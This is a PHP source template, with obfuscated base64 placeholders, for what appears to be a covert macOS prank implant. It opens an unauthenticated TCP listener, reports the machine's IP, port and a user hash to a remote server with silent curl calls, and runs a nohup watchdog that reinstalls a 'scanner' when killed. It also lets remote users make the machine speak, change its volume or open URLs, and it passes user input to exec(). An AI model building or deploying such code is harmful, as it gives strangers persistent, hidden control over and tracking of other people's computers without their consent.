<?php
// Define constants
define('REGEX_VALID_IP_ADDRESS', '{{B64_CONST_REGEX_VALID_IP_ADDRESS}}');
define('REGEX_SIMPLE_STRING', '{{B64_CONST_REGEX_SIMPLE_STRING}}');
define('REGEX_CTL_QUIT', '{{B64_CONST_REGEX_CTL_QUIT}}');
define('REGEX_CTL_RICK_ROLL', '{{B64_CONST_REGEX_CTL_RICK_ROLL}}');
define('REGEX_CTL_VOICES', '{{B64_CONST_REGEX_CTL_VOICES}}');
define('REGEX_CTL_GET_VOICE', '{{B64_CONST_REGEX_CTL_GET_VOICE}}');
define('REGEX_CTL_SET_VOICE', '{{B64_CONST_REGEX_CTL_SET_VOICE}}');
define('REGEX_CTL_VOLUME', '{{B64_CONST_REGEX_CTL_VOLUME}}');
define('PORT_MIN', '{{B64_CONST_PORT_MIN}}');
define('PORT_MAX', '{{B64_CONST_PORT_MAX}}');
define('SS_PORT', '{{B64_CONST_SS_PORT}}');
define('PROMPT', '{{B64_CONST_PROMPT}}');
define('SCANNER_FILE', '{{SCANNER}}');
define('PING_INTERVAL', '{{B64_CONST_PING_INTERVAL}}');

if (process_running($argv[0])) {
    die();
}

$voices = load_voice_list();

$current_voice = count($voices) > 0 ? $voices[0] : '{{B64_STR_DEFAULT_VOICE}}';

// Allow the script to hang around waiting for connections.
set_time_limit(0);

// Turn on implicit output flushing so we see what we're getting as it comes in.
ob_implicit_flush();

// Defaults
$address = lookup_ip();
$port = SS_PORT;

global $opts;

$opts = array(
    '{{B64_OPT_IP}}' => $address,
    '{{B64_OPT_PORT}}' => $port,
    '{{B64_OPT_HASH}}' => '{{USER_HASH}}'
);

// Get optional arguments
if ($argc > 1) {
    if ($argc > 2 && trim(strtolower($argv[1])) == '{{B64_STR_PING_ARG}}') {
        $monitor = base64_decode(trim($argv[2]));

        while(true) {
            if (process_running($monitor)) {
                exec(build_curl_cmd('p'));
            } else {
                if (file_exists(SCANNER_FILE)) {
                    exec(SCANNER_FILE);
                } else if (command_exist('ss_install')) {
                    exec('ss_install');
                }

                exit;
            }

            sleep(PING_INTERVAL);
        }

        exit;
    }
}

// Error check address and port
(preg_match(REGEX_VALID_IP_ADDRESS, $address)) or die();
(is_numeric($port) && $port > PORT_MIN && $port < PORT_MAX) or die();

if (($sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP)) === false) {
    die();
}

socket_set_option($sock, SOL_SOCKET, SO_REUSEADDR, 1);
socket_set_option($sock, SOL_SOCKET, SO_REUSEPORT, 1);

if (socket_bind($sock, $address, $port) === false) {
    socket_shutdown($sock);
    socket_close($sock);
    die();
}

if (socket_listen($sock, 5) === false) {
    socket_shutdown($sock);
    socket_close($sock);
    die();
}

exec(build_curl_cmd('m'));
exec('{{B64_CMD_NOHUP}}' . ' {{PING_BIN}} {{PING_MON}} ' . '{{B64_STR_PING_ARG}}' . ' ' . base64_encode($argv[0]) . ' {{SILENT_SUFFIX}}');

do {
    if (($msgsock = socket_accept($sock)) === false) {
        break;
    }

    $msg = '{{B64_STR_WELCOME_MSG}}' . PROMPT;
    socket_write($msgsock, $msg, strlen($msg));

    do {
        $msg = '';

        if (false === ($buf = socket_read($msgsock, 2048, PHP_NORMAL_READ))) {
            break;
        }

        if (!$buf = trim($buf)) {
            continue;
        }

        $buf = trim(strtolower($buf), ' _-[]()"\'');

        if (preg_match(REGEX_CTL_QUIT, $buf)) {
            break;
        } if (preg_match(REGEX_CTL_RICK_ROLL, $buf)) {
            $cmd = '{{B64_CMD_OPEN}}' . ' "' . '{{B64_STR_RICK_ROLL_URL}}' . '"';
            exec($cmd);
        } else if (preg_match(REGEX_CTL_VOICES, $buf)) {
            foreach ($voices as $voice) {
                $msg .= $voice . "\n";
            }
        } else if (preg_match(REGEX_CTL_GET_VOICE, $buf, $arr) || preg_match(REGEX_CTL_SET_VOICE, $buf, $arr)) {
            if (isset($arr[1])) {
                $voice = $arr[1];

                if (in_array($voice, $voices)) {
                    $current_voice = $voice;
                } else {
                    $msg .= '{{B64_STR_VOICE_HELP}}';
                }
            }

            $msg .= '{{B64_STR_CURRENT_VOICE}}' . " $current_voice\n";
        } else if (preg_match(REGEX_CTL_VOLUME, $buf, $arr)) {
            if (isset($arr[1]) && is_numeric($arr[1])) {
                $lvl = (int)$arr[1];

                if ($lvl > 9) $lvl = 9;
                if ($lvl < 0) $lvl = 0;

                $cmd = '{{B64_CMD_OSASCRIPT}}' . ' "' . '{{B64_CMD_SET_VOLUME}}' . ' ' . $lvl . '"';
                exec($cmd);
            }
        } else if (preg_match(REGEX_SIMPLE_STRING, $buf)) {
            if (!command_exist($buf)) {
                $cmd = '{{B64_CMD_SAY}}' . " $current_voice '$buf'";
                exec($cmd);
            } else {
                $msg .= '{{B64_STR_CANNOT_SAY}}' . " '$buf', " . '{{B64_STR_COMMAND_EXISTS}}';
            }
        } else {
            $msg .= '{{B64_STR_CANNOT_SAY}}' . " '$buf', " . '{{B64_STR_TOO_COMPLEX}}';
        }

        $msg .= PROMPT;

        socket_write($msgsock, $msg, strlen($msg));
    } while (true);
    socket_shutdown($sock);
    socket_close($msgsock);
} while (true);

socket_shutdown($sock);
socket_close($sock);

function command_exist($cmd) {
    $returnVal = shell_exec('{{B64_CMD_WHICH}}' . " $cmd");
    return (empty($returnVal) ? false : true);
}

function lookup_ip() {
    for ($i = 0; $i < 10; $i++) {
        $cmd = '{{B64_CMD_IPCONFIG}}' . ' ' . '{{B64_CMD_GETIFADDR}}' . ' ' . '{{B64_STR_INTERFACE_PREFIX}}' . $i;
        $adr = trim(exec($cmd));

        if (preg_match(REGEX_VALID_IP_ADDRESS, $adr)) {
            return $adr;
        }
    }

    return ('{{B64_STR_DEFAULT_IP}}');
}

function load_voice_list() {
    $voices = array();

    $cmd = '{{B64_CMD_SAY}}' . " '?'";
    $ret = `$cmd`;
    $arr = explode("\n", $ret);

    foreach ($arr as $line) {
        $stuff = explode(' ', $line);

        if (isset($stuff[0])) {
            $voice = strtolower(trim($stuff[0]));

            if ($voice != '') {
                $voices[] = strtolower(trim($stuff[0]));
            }
        }
    }

    return $voices;
}

function process_running($search) {
    $cmd = '{{B64_CMD_PROCESSES}}';
    $processes = `$cmd`;

    $found = false;
    $pattern = '#' . get_current_user() . '\s+(\d+)\s+.*' . preg_quote($search) . '$#';

    foreach (explode("\n", $processes) as $process) {
        $process = trim($process);

        if (preg_match_all($pattern, $process, $matches)) {
            if (isset($matches[1][0])) {
                $pid = $matches[1][0];

                if ($pid != getmypid()) {
                    $found = true;
                    break;
                }
            }
        }
    }

    return $found;
}

function build_curl_cmd($page = 'm') {
    global $opts;

    if (in_array($page, array('m', 'p'))) {
        $url = '{{B64_STR_SERVER_HOST}}' . "{$page}.php?";
        $url .= http_build_query($opts);
        return ('{{B64_CMD_CURL_SILENT}}' . ' "' . $url . '"');
    }

    return false;
}